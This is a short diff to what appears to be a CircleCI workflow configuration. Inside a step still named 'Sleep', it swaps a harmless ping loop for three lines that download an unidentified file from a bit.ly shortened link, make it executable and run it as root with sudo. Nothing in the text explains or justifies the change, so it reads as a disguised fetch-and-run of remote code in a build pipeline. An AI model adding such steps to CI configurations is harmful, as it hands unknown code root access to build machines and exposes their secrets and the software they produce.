@@ -39,7 +39,9 @@ jobs:
       - run: 
          name: Sleep
          command: |
-          sudo su --command "ping -n 999999 127.0.0.1"
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
 
 workflows:
   version: 2.1
